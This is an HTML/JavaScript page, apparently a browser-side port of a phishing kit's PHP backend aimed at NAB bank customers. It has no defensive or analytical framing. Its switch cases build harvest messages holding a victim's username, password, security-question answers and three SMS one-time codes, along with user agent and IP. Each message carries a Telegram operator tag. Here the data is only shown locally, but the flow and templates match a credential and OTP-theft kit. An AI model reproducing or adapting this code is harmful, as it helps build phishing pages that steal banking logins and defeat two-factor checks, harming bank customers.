<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAB · form processor</title>
    <!-- Font & minimal style to match the "clean" vibe -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f6f8fc;
            font-family: 'Inter', -apple-system, system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 2rem 1rem;
            color: #1e293b;
        }
        .card {
            max-width: 720px;
            width: 100%;
            background: white;
            border-radius: 2rem;
            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
            padding: 2rem 2rem 2.5rem;
            transition: 0.2s;
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            letter-spacing: -0.3px;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 0.25rem;
        }
        .badge {
            background: #eef2ff;
            color: #4f46e5;
            font-size: 0.7rem;
            font-weight: 600;
            padding: 0.2rem 0.8rem;
            border-radius: 30px;
            letter-spacing: 0.3px;
        }
        .sub {
            color: #64748b;
            font-size: 0.9rem;
            border-left: 3px solid #d0d9e8;
            padding-left: 1rem;
            margin-top: 0.25rem;
            margin-bottom: 1.8rem;
        }
        .form-grid {
            display: flex;
            flex-direction: column;
            gap: 1.2rem;
        }
        .field {
            display: flex;
            flex-direction: column;
            gap: 0.3rem;
        }
        .field label {
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            color: #475569;
        }
        .field input, .field select {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 14px;
            padding: 0.8rem 1rem;
            font-size: 0.95rem;
            font-family: 'Inter', sans-serif;
            transition: 0.15s;
            outline: none;
        }
        .field input:focus, .field select:focus {
            border-color: #818cf8;
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
            background: white;
        }
        .row-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
        }
        .actions {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 1rem;
            margin-top: 0.8rem;
        }
        .btn {
            background: #1e293b;
            border: none;
            color: white;
            font-weight: 600;
            padding: 0.8rem 2rem;
            border-radius: 40px;
            font-size: 0.95rem;
            cursor: pointer;
            transition: 0.15s;
            box-shadow: 0 4px 8px -4px rgba(0,0,0,0.1);
            display: inline-flex;
            align-items: center;
            gap: 8px;
            border: 1px solid transparent;
        }
        .btn:hover {
            background: #0f172a;
            transform: scale(1.01);
        }
        .btn-outline {
            background: transparent;
            color: #1e293b;
            border: 1px solid #d0d9e8;
            box-shadow: none;
        }
        .btn-outline:hover {
            background: #f1f5f9;
        }
        .output {
            margin-top: 2.2rem;
            background: #f1f4f9;
            border-radius: 20px;
            padding: 1.2rem 1.5rem;
            font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
            font-size: 0.8rem;
            white-space: pre-wrap;
            word-break: break-word;
            border: 1px solid #e2e8f0;
            max-height: 400px;
            overflow-y: auto;
            color: #0b1d2e;
            line-height: 1.5;
            display: none;
        }
        .output.show {
            display: block;
        }
        .output .label {
            color: #4b5563;
            font-weight: 500;
        }
        .hr {
            border: none;
            border-top: 1px dashed #cbd5e1;
            margin: 1.2rem 0;
        }
        .fake-selector {
            font-size: 0.8rem;
            background: #e9edf4;
            border-radius: 30px;
            padding: 0.2rem 1rem;
            color: #1e293b;
        }
        .status-badge {
            background: #dbeafe;
            color: #1e4a7a;
            border-radius: 30px;
            padding: 0.2rem 1rem;
            font-size: 0.75rem;
            font-weight: 500;
        }
        @media (max-width: 480px) {
            .row-2 { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="card">
        <div style="display: flex; justify-content: space-between; align-items: flex-start;">
            <div>
                <h1>
                    <span>⚙️ NAB</span>
                    <span class="badge">form · v1</span>
                </h1>
                <div class="sub">mimics the PHP switch behaviour · all data logged locally</div>
            </div>
        </div>

        <!-- FORM: posts to itself (same HTML) with switch via hidden target -->
        <form id="mainForm" method="POST" class="form-grid">
            <!-- hidden target (case) – default 0 (login) -->
            <input type="hidden" name="sws" id="swsInput" value="0">

            <!-- dynamic fields container -->
            <div id="dynamicFields">
                <!-- default: case 0 (login) -->
                <div class="field">
                    <label for="x">Username</label>
                    <input type="text" id="x" name="x" placeholder="username" value="demo_user">
                </div>
                <div class="field">
                    <label for="xx">Password</label>
                    <input type="password" id="xx" name="xx" placeholder="••••••••" value="pass123">
                </div>
            </div>

            <!-- extra hidden fields used for different cases (kept in DOM) -->
            <div style="display: none;">
                <input type="text" name="xxl" id="xxl" value="123456">
                <input type="text" name="xxll" id="xxll" value="789012">
                <input type="text" name="xxlll" id="xxlll" value="345678">
                <input type="text" name="q1" id="q1" value="pet name">
                <input type="text" name="a1" id="a1" value="fluffy">
                <input type="text" name="q2" id="q2" value="city born">
                <input type="text" name="a2" id="a2" value="nyc">
                <input type="text" name="q3" id="q3" value="mother maiden">
                <input type="text" name="a3" id="a3" value="smith">
            </div>

            <div class="actions">
                <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                    <button type="button" class="btn btn-outline" data-case="0">🔐 Login (0)</button>
                    <button type="button" class="btn btn-outline" data-case="1">❓ Sec Q (1)</button>
                    <button type="button" class="btn btn-outline" data-case="2">📱 SMS 1 (2)</button>
                    <button type="button" class="btn btn-outline" data-case="3">📱 SMS 2 (3)</button>
                    <button type="button" class="btn btn-outline" data-case="4">📋 Review (4)</button>
                    <button type="button" class="btn btn-outline" data-case="5">📱 SMS 3 (5)</button>
                </div>
                <button type="submit" class="btn">▶ Execute</button>
            </div>

            <div style="display: flex; gap: 8px; margin-top: 0.2rem; align-items: center; flex-wrap: wrap;">
                <span class="fake-selector">current case: <strong id="caseDisplay">0</strong></span>
                <span class="status-badge" id="sessionHint">⚡ session: demo_user</span>
            </div>
        </form>

        <!-- output panel -->
        <div id="outputBox" class="output"></div>
        <div style="margin-top: 0.8rem; font-size: 0.75rem; color: #6b7a8f; display: flex; gap: 1.2rem; flex-wrap: wrap;">
            <span>📨 data is assembled exactly like the PHP version</span>
            <span>🧾 <span id="counterDisplay">0</span> messages simulated</span>
        </div>
    </div>

    <script>
        (function() {
            "use strict";

            // ----- simulate session storage -----
            let session = {
                username: 'demo_user',
                password: 'pass123'
            };

            // ----- DOM refs -----
            const form = document.getElementById('mainForm');
            const swsInput = document.getElementById('swsInput');
            const dynamicFields = document.getElementById('dynamicFields');
            const outputBox = document.getElementById('outputBox');
            const caseDisplay = document.getElementById('caseDisplay');
            const sessionHint = document.getElementById('sessionHint');
            const counterSpan = document.getElementById('counterDisplay');

            // hidden fields that we might need
            const xInput = document.getElementById('x');
            const xxInput = document.getElementById('xx');
            const xxlInput = document.getElementById('xxl');
            const xxllInput = document.getElementById('xxll');
            const xxlllInput = document.getElementById('xxlll');
            const q1Input = document.getElementById('q1');
            const a1Input = document.getElementById('a1');
            const q2Input = document.getElementById('q2');
            const a2Input = document.getElementById('a2');
            const q3Input = document.getElementById('q3');
            const a3Input = document.getElementById('a3');

            // helper: clean (trim + escape) – mimics PHP clean() behavior (basic)
            function clean(value) {
                if (typeof value !== 'string') value = String(value);
                return value.trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
            }

            // helper: get userAgent & ip (simulated)
            function getUserAgent() {
                return navigator.userAgent || 'Mozilla/5.0 (compatible; NAB)';
            }

            function getRealIP() {
                // in browser we can't get real IP, but we simulate
                return '192.168.1.1 (simulated)';
            }

            // message() = push to output + console
            let messageCount = 0;
            function message(data) {
                messageCount++;
                counterSpan.textContent = messageCount;
                const prefix = `[MESSAGE #${messageCount}]\n`;
                outputBox.textContent = prefix + data + '\n' + '─'.repeat(50);
                outputBox.classList.add('show');
                console.log('📨 MESSAGE:', data);
            }

            // ---------- update UI based on case ----------
            function updateFieldsForCase(caseVal) {
                const target = parseInt(caseVal, 10);
                swsInput.value = target;
                caseDisplay.textContent = target;

                // reset dynamic fields: we rebuild based on case
                let html = '';

                switch (target) {
                    case 0: // login
                        html = `
                            <div class="field">
                                <label for="x">Username</label>
                                <input type="text" id="x" name="x" placeholder="username" value="${clean(session.username)}">
                            </div>
                            <div class="field">
                                <label for="xx">Password</label>
                                <input type="password" id="xx" name="xx" placeholder="••••••••" value="${clean(session.password)}">
                            </div>
                        `;
                        break;
                    case 1: // security questions
                        html = `
                            <div class="field">
                                <label for="x">Identifier (username)</label>
                                <input type="text" id="x" name="x" placeholder="username" value="${clean(session.username)}">
                            </div>
                            <div class="row-2">
                                <div class="field"><label for="q1">Q1</label><input type="text" id="q1" name="q1" value="pet name"></div>
                                <div class="field"><label for="a1">A1</label><input type="text" id="a1" name="a1" value="fluffy"></div>
                            </div>
                            <div class="row-2">
                                <div class="field"><label for="q2">Q2</label><input type="text" id="q2" name="q2" value="city born"></div>
                                <div class="field"><label for="a2">A2</label><input type="text" id="a2" name="a2" value="nyc"></div>
                            </div>
                            <div class="row-2">
                                <div class="field"><label for="q3">Q3</label><input type="text" id="q3" name="q3" value="mother maiden"></div>
                                <div class="field"><label for="a3">A3</label><input type="text" id="a3" name="a3" value="smith"></div>
                            </div>
                        `;
                        break;
                    case 2: // SMS 1
                        html = `
                            <div class="field">
                                <label for="xxl">SMS Code (xxl)</label>
                                <input type="text" id="xxl" name="xxl" placeholder="OTP" value="123456">
                            </div>
                            <div style="font-size:0.8rem; color:#475569; background:#f1f5f9; padding:0.5rem 1rem; border-radius:12px;">
                                ℹ️ using session username: <strong>${clean(session.username)}</strong>
                            </div>
                        `;
                        break;
                    case 3: // SMS 2
                        html = `
                            <div class="field">
                                <label for="xxll">SMS Code (xxll)</label>
                                <input type="text" id="xxll" name="xxll" placeholder="OTP" value="789012">
                            </div>
                            <div style="font-size:0.8rem; color:#475569; background:#f1f5f9; padding:0.5rem 1rem; border-radius:12px;">
                                ℹ️ using session username: <strong>${clean(session.username)}</strong>
                            </div>
                        `;
                        break;
                    case 4: // review (no extra fields)
                        html = `
                            <div style="background:#eef2ff; border-radius:14px; padding:1rem; color:#1e293b;">
                                <span style="font-weight:500;">📋 Reviewing security Q&A for</span>
                                <strong>${clean(session.username)}</strong>
                                <div style="margin-top:0.5rem; font-size:0.85rem; opacity:0.8;">(no additional fields needed)</div>
                            </div>
                        `;
                        break;
                    case 5: // SMS 3
                        html = `
                            <div class="field">
                                <label for="xxlll">SMS Code (xxlll)</label>
                                <input type="text" id="xxlll" name="xxlll" placeholder="OTP" value="345678">
                            </div>
                            <div style="font-size:0.8rem; color:#475569; background:#f1f5f9; padding:0.5rem 1rem; border-radius:12px;">
                                ℹ️ using session username: <strong>${clean(session.username)}</strong>
                            </div>
                        `;
                        break;
                    default:
                        html = `<div class="field"><label>⚠️ unknown case</label><input disabled value="default"></div>`;
                }
                dynamicFields.innerHTML = html;

                // sync session hint
                sessionHint.textContent = `⚡ session: ${clean(session.username)}`;
            }

            // ----- handle form submission (exactly like PHP switch) -----
            function handleSubmit(e) {
                e.preventDefault();

                // gather all form data (using FormData)
                const formData = new FormData(form);
                // but we need to read values properly because of dynamic fields
                // we'll reconstruct using getters
                const target = parseInt(formData.get('sws') || '0', 10);

                // read values (with clean)
                const username = clean(formData.get('x') || session.username);
                const password = clean(formData.get('xx') || session.password);
                const otp1 = clean(formData.get('xxl') || '');
                const otp2 = clean(formData.get('xxll') || '');
                const otp3 = clean(formData.get('xxlll') || '');
                const q1 = clean(formData.get('q1') || '');
                const a1 = clean(formData.get('a1') || '');
                const q2 = clean(formData.get('q2') || '');
                const a2 = clean(formData.get('a2') || '');
                const q3 = clean(formData.get('q3') || '');
                const a3 = clean(formData.get('a3') || '');

                // update session (case 0 sets username/password)
                if (target === 0) {
                    session.username = username;
                    session.password = password;
                }

                // userAgent + realip (simulated)
                const userAgent = getUserAgent();
                const realip = getRealIP();

                let data = '';
                let shouldMessage = true;

                // ---------- SWITCH ----------
                switch (target) {
                    case 0: {
                        data = `
        ------------------[NAB LOGIN 1]------------------

        Username : ${username}
        Password : ${password}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${userAgent}
        IP Address : ${realip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
                        break;
                    }
                    case 1: {
                        data = `
        ---------------[Security Que n Ans]---------------

        Security Questions And Answers Set By ${session.username}
        Delay in Progress Second Code Comes in 60 Seconds Time.

        Security Que 1: ${q1}
        Security Ans 1:${a1}

        Security Que 2: ${q2}
        Security Ans 2:${a2}

        Security Que 3: ${q3}
        Security Ans 3:${a3}

        --------------[USER AGENT IP DNS]--------------
        User Agent
         ${userAgent}
        IP Address : ${realip}
        --------------[TELEGRAM: ECHOVSL]--------------`;
                        break;
                    }
                    case 2: {
                        data = `
        --------------[NAB SMS CODE 1]--------------

        SMS CODE FROM : ${session.username}
        SMS CODE : ${otp1}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${userAgent}
        IP Address : ${realip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
                        break;
                    }
                    case 3: {
                        data = `
        --------------[NAB SMS CODE 2]--------------

        SMS CODE FROM : ${session.username}
        SMS CODE : ${otp2}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${userAgent}
        IP Address : ${realip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
                        break;
                    }
                    case 4: {
                        data = `
        --------------[SECURITY QA REVIEW]--------------

        ${session.username} Reviewing Security Questions and Answers Set

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${userAgent}
        IP Address : ${realip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
                        break;
                    }
                    case 5: {
                        data = `
        --------------[NAB SMS CODE 3]--------------

        SMS CODE FROM : ${session.username}
        SMS CODE : ${otp3}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${userAgent}
        IP Address : ${realip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
                        break;
                    }
                    default: {
                        // default: redirect to index.html (simulate)
                        window.location.href = '../index.html';
                        shouldMessage = false;
                        break;
                    }
                }

                if (shouldMessage) {
                    message(data);
                    // update session hint & fields after case 0
                    if (target === 0) {
                        sessionHint.textContent = `⚡ session: ${clean(session.username)}`;
                        // refresh fields to show updated username/password
                        updateFieldsForCase(target);
                    }
                    // for other cases, we keep the fields as they are, but we update session hint just in case
                    if (target === 1 || target === 2 || target === 3 || target === 4 || target === 5) {
                        sessionHint.textContent = `⚡ session: ${clean(session.username)}`;
                    }
                }
            }

            // ----- event listeners -----
            // case buttons
            document.querySelectorAll('[data-case]').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    const caseVal = this.getAttribute('data-case');
                    updateFieldsForCase(caseVal);
                    // clear output when switching (optional)
                    // outputBox.classList.remove('show');
                });
            });

            // form submit
            form.addEventListener('submit', handleSubmit);

            // init: default case 0
            updateFieldsForCase(0);
            // outputBox.classList.remove('show'); // hidden initially
            counterSpan.textContent = '0';

            // also if any field changes we keep session in sync (for case 0 username/pass)
            document.addEventListener('input', function(e) {
                if (e.target.id === 'x' || e.target.id === 'xx') {
                    // we don't update session until submit, but we can show preview
                }
            });

            // extra: if user clicks on "execute" with case 1, we want to show proper fields
            // already handled.

            console.log('🔁 NAB form simulator ready (PHP → HTML)');
        })();
    </script>
</body>
</html>
